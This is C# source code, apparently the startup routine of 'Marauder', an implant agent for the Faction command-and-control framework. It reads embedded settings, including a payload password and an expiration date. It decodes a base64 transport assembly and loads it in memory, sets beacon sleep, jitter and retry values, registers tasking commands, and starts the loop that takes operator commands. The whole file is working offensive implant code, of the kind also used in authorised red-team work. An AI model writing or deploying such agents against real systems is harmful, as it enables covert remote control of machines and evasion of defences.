using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Collections.Generic;
using Newtonsoft.Json;

using Faction.Modules.Dotnet.Common;

using Marauder.Services;
using Marauder.Objects;
using Marauder.Commands;

namespace Marauder
{
  static class Marauder
  {

    static public void Start()
    {
      Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Marauder.settings.json");
      Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
      State.PayloadName = settings["PayloadName"];
      State.Password = settings["Password"];
      State.InitialTransport = settings["Transport"];
      if (!String.IsNullOrEmpty(settings["ExpirationDate"]))
      {
        State.ExpirationDate = DateTime.Parse(settings["ExpirationDate"]);
      }

      if (!String.IsNullOrEmpty(settings["Debug"]))
      {
        State.Debug = Boolean.Parse(settings["Debug"]);
      }

      State.Sleep = 5;
      State.Jitter = 1.5;
      State.MaxAttempts = 20;
      State.LastTaskName = null;
#if DEBUG
      Console.Write(@"

███╗   ███╗ █████╗ ██████╗  █████╗ ██╗   ██╗██████╗ ███████╗██████╗ 
████╗ ████║██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗
██╔████╔██║███████║██████╔╝███████║██║   ██║██║  ██║█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██╔══██╗██╔══██║██║   ██║██║  ██║██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║╚██████╔╝██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                    
");

      Console.WriteLine("Starting Marauder..");

      Logging.Write("Main", String.Format("Creating Transport.."));
#endif
      byte[] transportByte = Convert.FromBase64String(State.InitialTransport);
      Assembly transportAssembly = Assembly.Load(transportByte);
      Type transportType = transportAssembly.GetType("Faction.Modules.Dotnet.Common.Transport");
      var activatedTransport = Activator.CreateInstance(transportType);
      AgentTransport initialTransport = (AgentTransport)activatedTransport;
#if DEBUG
      Logging.Write("Main", $"Loaded Transport Type: {initialTransport.Name}");
#endif
      State.TransportService = new TransportService();
      State.TransportService.AddTransport(initialTransport);
      State.TransportService.SetPrimaryTransport(initialTransport.Name);

#if DEBUG      
      Logging.Write("Main", "Creating Services..");
#endif
      State.CryptoService = new CryptoService();
      State.CommandService = new CommandService();

#if DEBUG      
      Logging.Write("Main", "Loading Commands..");
#endif
      State.CommandService.AvailableCommands.Add(new TasksCommand());
      State.CommandService.AvailableCommands.Add(new ExitCommand());

#if DEBUG      
      Logging.Write("Main", "Starting Marauder Loop..");
#endif

      State.TransportService.Start();
    }
  }
}
